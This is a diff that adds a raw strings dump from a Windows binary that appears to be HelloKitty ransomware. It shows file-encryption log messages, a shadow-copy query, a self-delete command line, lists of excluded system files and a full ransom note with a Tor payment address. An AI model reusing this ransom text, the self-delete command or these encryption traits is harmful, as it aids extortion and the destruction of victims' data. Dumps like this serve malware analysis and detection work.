@@ -1,0 +1,708 @@
+!This program cannot be run in DOS mode.
+AcRich
+`.rdata
+@.data
+.reloc
+VfHf#E
+NfHf#E
+Nf@f#E
+K$9K$s
+WPh\$B
+D40Phx
+t$$jHV
+u_PPPP
+A8l>+
+QQSVWd
+URPQQh
+;t$,v-
+UQPXY]Y[
+^$+^8+
+QSSSSj
+TVhtAB
+Wj0XPV
+WWWPWS
+u-PWWS
+SSVWh 
+f9:t!V
+|VWj=S
+QQSWj0j@
+PPPPPWS
+PP9E u:PPVWP
+PPPPPPPP
+InitializeConditionVariable
+SleepConditionVariableCS
+WakeAllConditionVariable
+Unknown exception
+bad allocation
+bad array new length
+FlsAlloc
+FlsFree
+FlsGetValue
+FlsSetValue
+InitializeCriticalSectionEx
+bad exception
+__based(
+__cdecl
+__pascal
+__stdcall
+__thiscall
+__fastcall
+__vectorcall
+__clrcall
+__eabi
+__swift
+__ptr64
+__restrict
+__unaligned
+restrict(
+ delete
+operator
+`vftable'
+`vbtable'
+`vcall'
+`typeof'
+`local static guard'
+`string'
+`vbase destructor'
+`vector deleting destructor'
+`default constructor closure'
+`scalar deleting destructor'
+`vector constructor iterator'
+`vector destructor iterator'
+`vector vbase constructor iterator'
+`virtual displacement map'
+`eh vector constructor iterator'
+`eh vector destructor iterator'
+`eh vector vbase constructor iterator'
+`copy constructor closure'
+`udt returning'
+`local vftable'
+`local vftable constructor closure'
+ new[]
+ delete[]
+`omni callsig'
+`placement delete closure'
+`placement delete[] closure'
+`managed vector constructor iterator'
+`managed vector destructor iterator'
+`eh vector copy constructor iterator'
+`eh vector vbase copy constructor iterator'
+`dynamic initializer for '
+`dynamic atexit destructor for '
+`vector copy constructor iterator'
+`vector vbase copy constructor iterator'
+`managed vector copy constructor iterator'
+`local static thread guard'
+operator "" 
+operator co_await
+ Type Descriptor'
+ Base Class Descriptor at (
+ Base Class Array'
+ Class Hierarchy Descriptor'
+ Complete Object Locator'
+`h````
+xpxxxx
+(null)
+CorExitProcess
+ !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+CompareStringEx
+GetCurrentPackageId
+LCMapStringEx
+LocaleNameToLCID
+NAN(SNAN)
+nan(snan)
+NAN(IND)
+nan(ind)
+[aOni*{
+~ $s%r
+@b;zO]
+v2!L.2
+1#QNAN
+1#SNAN
+?5Wg4p
+%S#[k=
+"B <1=
+_hypot
+_nextafter
+hSingle block msg
+DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
+8-oVX]
+""""""""""""""""
+""""""""""""""""
+<Se>/E
+D7q/;M
+EMD#d<
+; D(V2
+abcdefghbcdefghicdefghijdefghijkefghijklfghijklmghijklmnhijklmnoijklmnopjklmnopqklmnopqrlmnopqrsmnopqrstnopqrstu
+ees401ep1
+ees449ep1
+ees677ep1
+ees1087ep2
+ees541ep1
+ees613ep1
+ees887ep1
+ees1171ep1
+ees659ep1
+ees761ep1
+ees1087ep1
+ees1499ep1
+ees401ep2
+ees439ep1
+ees593ep1
+ees743ep1
+ees443ep1
+ees587ep1
+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
+string too long
+IsWow64Process
+kernel32.dll
+(%d) [%d] %s: COINITIALIZE
+(%d) [%d] %s: SET ERROR MODE
+(%d) [%d] %s: STOP DOUBLE PROCESS RUN
+(%d) [%d] %s: DO IOCP
+(%d) [%d] %s: Total time of encryption: %llu seconds
+(%d) [%d] %s: Local free
+ReadWritePoolThread
+(%d) [%d] %s: ReadWritePoolThread(%u) starting...
+(%d) [%d] %s: (%u) ERROR: Unknown unhandled error, closing file.
+(%d) [%d] %s: ERROR: Failed to encrypt AES block
+(%d) [%d] %s: ERROR: Write current block %u
+(%d) [%d] %s: ERROR: read next block %u
+(%d) [%d] %s: ERROR: FAILED TO ENCRYPT EOF
+(%d) [%d] %s: ERROR: Write last block failed %u
+RmStartSession
+RmRegisterResources
+RmGetList
+RmEndSession
+RmShutdown
+SearchFolder
+(%d) [%d] %s: Info: search proc stopping...
+CalculateSpeedsThread
+(%d) [%d] %s: Global stop flagged, CalcSpeedThread() job done
+DriveSearchThread
+(%d) [%d] %s: Thread(%u): Looking for files in drive %S
+(%d) [%d] %s: Thread(%u): Search thread job done
+DoIOCP
+(%d) [%d] %s: Bad params
+(%d) [%d] %s: CPU AES +
+(%d) [%d] %s: Number of threads %u
+(%d) [%d] %s: ERROR: Failed to create io port %u, quit.
+(%d) [%d] %s: Looking for folder from cmd: %S
+(%d) [%d] %s: Search folder %S complete
+(%d) [%d] %s: Info: Waiting search threads job done
+(%d) [%d] %s: Info: All search threads jobs done
+(%d) [%d] %s: Waiting for all handles will be processed...
+(%d) [%d] %s: Nothing to process... quit loop
+(%d) [%d] %s: Waiting for working threads done
+(%d) [%d] %s: Threads was terminated ?
+vector<T> too long
+.text$di
+.text$mn
+.text$x
+.text$yd
+.idata$5
+.00cfg
+.CRT$XCA
+.CRT$XCAA
+.CRT$XCU
+.CRT$XCZ
+.CRT$XIA
+.CRT$XIAA
+.CRT$XIAC
+.CRT$XIC
+.CRT$XIZ
+.CRT$XLA
+.CRT$XLZ
+.CRT$XPA
+.CRT$XPX
+.CRT$XPXA
+.CRT$XPZ
+.CRT$XTA
+.CRT$XTZ
+.rdata
+.rdata$T
+.rdata$r
+.rdata$zzzdbg
+.rtc$IAA
+.rtc$IZZ
+.rtc$TAA
+.rtc$TZZ
+.tls$ZZZ
+.xdata$x
+.edata
+.idata$2
+.idata$3
+.idata$4
+.idata$6
+.data$r
+inn.exe
+ntru_crypto_drbg_external_instantiate
+ntru_crypto_drbg_generate
+ntru_crypto_drbg_instantiate
+ntru_crypto_drbg_reseed
+ntru_crypto_drbg_uninstantiate
+ntru_crypto_ntru_decrypt
+ntru_crypto_ntru_encrypt
+ntru_crypto_ntru_encrypt_keygen
+ntru_crypto_ntru_encrypt_publicKey2SubjectPublicKeyInfo
+ntru_crypto_ntru_encrypt_subjectPublicKeyInfo2PublicKey
+ReadFile
+GetLogicalDrives
+CancelIo
+InterlockedExchange
+FindFirstFileW
+GetFileSizeEx
+HeapFree
+EnterCriticalSection
+GetCommandLineW
+FindNextFileW
+GetCurrentProcess
+lstrlenW
+WriteFile
+InterlockedDecrement
+GetModuleFileNameW
+WaitForMultipleObjects
+LeaveCriticalSection
+InitializeCriticalSection
+SetErrorMode
+GetQueuedCompletionStatus
+CreateMutexW
+FindClose
+WaitForSingleObject
+CreateFileW
+GetCurrentThreadId
+lstrcatA
+GetModuleHandleA
+PostQueuedCompletionStatus
+SetFileAttributesW
+GetLastError
+InterlockedExchangeAdd
+CloseHandle
+GetSystemInfo
+LoadLibraryW
+CreateThread
+HeapAlloc
+GetProcAddress
+LocalFree
+DeleteCriticalSection
+ExitProcess
+GetProcessHeap
+SystemTimeToFileTime
+lstrcpyW
+InterlockedIncrement
+GetSystemTime
+lstrcmpiW
+CreateIoCompletionPort
+OpenMutexW
+lstrcmpW
+SetConsoleTitleW
+MoveFileW
+GetDriveTypeW
+QueryPerformanceCounter
+KERNEL32.dll
+wsprintfW
+GetKeyboardLayoutList
+CharLowerW
+USER32.dll
+CryptReleaseContext
+CryptGenRandom
+CryptAcquireContextW
+ADVAPI32.dll
+SHEmptyRecycleBinA
+ShellExecuteW
+CommandLineToArgvW
+SHELL32.dll
+CoInitialize
+CoCreateInstance
+CoSetProxyBlanket
+ole32.dll
+OLEAUT32.dll
+wnsprintfA
+PathFindFileNameW
+PathRemoveFileSpecW
+PathAddBackslashW
+StrStrW
+SHLWAPI.dll
+WNetCloseEnum
+WNetEnumResourceW
+WNetOpenEnumW
+MPR.dll
+InitializeCriticalSectionAndSpinCount
+SetEvent
+ResetEvent
+WaitForSingleObjectEx
+CreateEventW
+GetModuleHandleW
+IsProcessorFeaturePresent
+IsDebuggerPresent
+UnhandledExceptionFilter
+SetUnhandledExceptionFilter
+GetStartupInfoW
+GetCurrentProcessId
+GetSystemTimeAsFileTime
+InitializeSListHead
+TerminateProcess
+RtlUnwind
+RaiseException
+SetLastError
+TlsAlloc
+TlsGetValue
+TlsSetValue
+TlsFree
+FreeLibrary
+LoadLibraryExW
+EncodePointer
+GetModuleHandleExW
+GetModuleFileNameA
+MultiByteToWideChar
+WideCharToMultiByte
+GetStdHandle
+GetCommandLineA
+GetACP
+CompareStringW
+LCMapStringW
+GetFileType
+SetFilePointerEx
+GetConsoleMode
+GetConsoleCP
+FindFirstFileExA
+FindNextFileA
+IsValidCodePage
+GetOEMCP
+GetCPInfo
+GetEnvironmentStringsW
+FreeEnvironmentStringsW
+SetEnvironmentVariableA
+SetStdHandle
+GetStringTypeW
+FlushFileBuffers
+WriteConsoleW
+HeapSize
+HeapReAlloc
+DecodePointer
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+7f/C2{
+VL9F7q
+.?AVbad_alloc@std@@
+.?AVexception@std@@
+.?AVbad_array_new_length@std@@
+.?AVtype_info@@
+.?AVlogic_error@std@@
+.?AVlength_error@std@@
+.?AVbad_exception@std@@
+00060^0d0p0
+111c4q4
+6<7K7`7
+?$?6?@?R?\?q?{?
+2f3[6b6M9l9#;0;<;F;
+=3><?@?D?
+H0L0e2|2
+0@1G1P1_1d1q1x1~1
+2K2Q2^2l2
+6)6.6;6I6Q6^6c6n6u6
+7"848B8]8d8v8
+9 9-9?9T9b9q9
+<M=X=^=
+0i0o0
+01$1+121f1:2
+5%5-535:5?5L5Y5g5o5u5|5
+66-656;6B6G6U6c6p6}6
+;Q<W<b<
+<P=c=n=~=
+>,>4>D>J>r>
+K1[1a1g1x1~1
+1$2-2:2W2d2
+3#454<4E4X4b4o4u4|4
+5$5*575W5o5
+8O8T8a8o8x8
+f0V2Q3a3
+0#020A0P0^0G1(2
+3H4m4z4
+555?5I5S5Z5
+6+757L7c7p7
+838A8n8
+9:9H9X9g9
+:&:9:H:
+;*;9;q;
+<%<c<t<
+=G=V=j=
+>B>T>j>
+?G?X?j?|?
+2&2N2X2o2
+3-3A3Q3\3
+4#4B4P4`4p4x4
+4*5;5N5a5l5
+7$7I7S7`7m7
+8 8-8:8]8g8
+9'9H9R9^9k9
+:$:9:K:j:w:
+;!;9;R;
+<<1<@<O<
+E0L0j1q1
+6%7,7J8Q8G?~?
+1)181K1W1g1x1
+1A2N2u2}2
+3&3,31373B3H3W3^3c3l3q3z3
+4"41494E4V4]4
+5%50565=5
+696N6S6X6y6~6
+7$8;8l8
+:):2:E:&;F;P;p;
+=#=)=S=y=
+>#>*>J>P>V>\>b>h>o>v>}>
+3 4#545d7
+8+898?8Z8
+999Y9g9n9t9
+:*:U:]:
+;;);5;:;?;Z;d;p;u;z;
+<$<6<B<L<Q<u<
+<<O<^<
+0D3W3u3
+315h5o5t5x5|5
+6 6$6(6,6
+;'<.<5<O<^<l<x<
+=)=7=E=P=f=z=
+B2_3q3
+4054585<5@5D5H5L52:N:R:V:Z:^:b:f:j:n:r:v:z:
+323=3n3
+5>5M5c5y5
+5G6N6`6i6
+7\7n7t7
+;*<I<s<
+= =%=/=4=?=J=W=e=r=
+1!1W1\1i1u1
+2 2+212?2H2M2Z2_2l2z2
+4&4,4@4L4
+?S?d?~?
+1"1'1D1L1
+2 2B2T2
+3)3.333N3X3t3
+4#4.43484Y4i4
+5"5@5c5n5{5
+6.6:6H6i6p6
+8(9C9~9
+:&<-=c=
+:-<8<t<
+2?2f2q2
+2/3N3d3n3
+515Z5v5
+5-6^6z6
+0!101B1T1p1
+2%242>2K2U2e2
+3"5O5p5u5
+:&:::O:
+>2?9?@?G?T?
+1 181J1w1
+353<3X3_3v3
+5*5<5N5o5
+102E2V2
+8$8);m>t>{>
+J0Y0x0
+4)7=8C8
+516=6Q6]6i6
+77/7;7J7N8
+=,===E=U=f=
+?U?a?m?y?
+<{=!?>?
+5L5V5`5r5x5|5
+,24282<2@2L2P2T2X2\2`2t2x2|2D3H3L3d3h3l3
+7 7$7(7,7074787<7@7D7H7L7P7T7X7\7`7d7h7l7p7t7x7|7
+8 8$8(8,8084888<8@8D8H8L8P8T8X8\8`8d8h8l8p8t8x8|8
+0 0$0(040<0@0D0H0L0
+: :$:(:,:0:4:8:<:@:D:H:L:P:T:X:d:h:l:p:t:x:|:
+2\2d2l2t2|2
+3$3,343<3D3L3T3\3d3l3t3|3
+4$4,444<4D4L4T4\4d4l4t4|4
+5$5,545<5D5L5T5\5d5l5t5|5
+6$6,646<6D6L6T6\6d6l6t6|6
+7$7,747<7D7L7T7\7d7l7t7|7
+8$8,848<8D8L8T8\8d8l8t8|8
+9$9,949<9D9L9T9\9d9l9t9
+4 4(40484@4H4P4X4`4h4p4x4
+5 5(50585@5H5P5X5`5h5p5x5
+6 6(60686@6H6P6X6`6h6p6x6
+7 7(70787@7H7P7X7`7h7p7x7
+8 8(80888@8H8P8X8`8h8p8x8
+9 9(90989@9H9P9X9`9h9p9x9
+: :(:0:8:@:H:P:X:`:h:p:x:
+8$8,848<8D8L8T8\8d8l8t8|8
+8 =$=(=,=8=<=@=D=
+0<4<8<<<
+<(=,=0=4=L=P=`=d=l=
+> >0>4>D>H>P>h>x>|>
+?(?,?0?8?P?
+3L3\3h3p3
+4 4(4,444H4P4d4l4t4|4
+585@5D5`5h5l5|5
+64686X6x6
+7 7<7@7`7
+8(8H8h8
+9(9H9h9
+0(181H1X1h1
+7(7,7074787<7@7D7H7L7X7\7`7d7h7l7p7t7
+< <$<(<,<0<4<8<D<p<
+< =L=x=
+0(0H0h0
+api-ms-win-core-synch-l1-2-0.dll
+kernel32.dll
+Bapi-ms-win-core-fibers-l1-1-1
+api-ms-win-core-synch-l1-2-0
+kernel32
+api-ms-
+ext-ms-
+(null)
+mscoree.dll
+         (((((                  H
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+Bapi-ms-win-appmodel-runtime-l1-1-1
+api-ms-win-core-datetime-l1-1-1
+api-ms-win-core-file-l2-1-1
+api-ms-win-core-localization-l1-2-1
+api-ms-win-core-localization-obsolete-l1-2-0
+api-ms-win-core-processthreads-l1-1-2
+api-ms-win-core-string-l1-1-0
+api-ms-win-core-sysinfo-l1-2-1
+api-ms-win-core-winrt-l1-1-0
+api-ms-win-core-xstate-l2-1-0
+api-ms-win-rtcore-ntuser-window-l1-1-0
+api-ms-win-security-systemfunctions-l1-1-0
+ext-ms-win-kernel32-package-current-l1-1-0
+ext-ms-win-ntuser-dialogbox-l1-1-0
+ext-ms-win-ntuser-windowstation-l1-1-0
+advapi32
+user32
+Bja-JP
+zh-CHS
+az-AZ-Latn
+uz-UZ-Latn
+kok-IN
+syr-SY
+div-MV
+quz-BO
+sr-SP-Latn
+az-AZ-Cyrl
+uz-UZ-Cyrl
+quz-EC
+sr-SP-Cyrl
+quz-PE
+smj-NO
+bs-BA-Latn
+smj-SE
+sr-BA-Latn
+sma-NO
+sr-BA-Cyrl
+sma-SE
+sms-FI
+smn-FI
+zh-CHT
+az-az-cyrl
+az-az-latn
+bs-ba-latn
+div-mv
+kok-in
+quz-bo
+quz-ec
+quz-pe
+sma-no
+sma-se
+smj-no
+smj-se
+smn-fi
+sms-fi
+sr-ba-cyrl
+sr-ba-latn
+sr-sp-cyrl
+sr-sp-latn
+syr-sy
+uz-uz-cyrl
+uz-uz-latn
+zh-chs
+zh-cht
+CONOUT$
+gHelloKittyMutex
+__ProviderArchitecture
+ROOT\cimv2
+select * from Win32_ShadowCopy
+Win32_ShadowCopy.ID='%s'
+Hello dear user.
+Your files have been encrypted.
+-- What does it mean?!
+Content of your files have been modified. Without special key you can't undo that operation.
+-- How to get special key?
+If you want to get it, you must pay us some money and we will help you.
+We will give you special decryption program and instructions.
+-- Ok, how i can pay you?
+1) Download TOR browser, if you don't know how to do it you can google it.
+2) Open this website in tor browser: %s/%S
+3) Follow instructions in chat. 
+http://6x7dp6h3w6q3ugjv4yv5gycj3femb24kysgry5b44hhgfwc5ml5qrdad.onion
+/C ping 127.0.0.1 & del %s
+cmd.exe
+.crypted
+).crypted
+Rstrtmgr.dll
+programdata
+$recycle.bin
+program files
+windows
+all users
+appdata
+application data
+local settings
+read_me_lkdtt.txt
+pagefile.sys
+ntdetect.com
+autoexec.bat
+desktop.ini
+autorun.inf
+ntuser.dat
+iconcache.db
+bootsect.bak
+boot.ini
+bootfont.bin
+config.sys
+io.sys
+msdos.sys
+ntuser.dat.log
+thumbs.db
+swapfile.sys
+read=%u kbytes, write=%u kbytes, opened=%u, encPS=%u, totalFound=%u, TotalEncrypted=%u
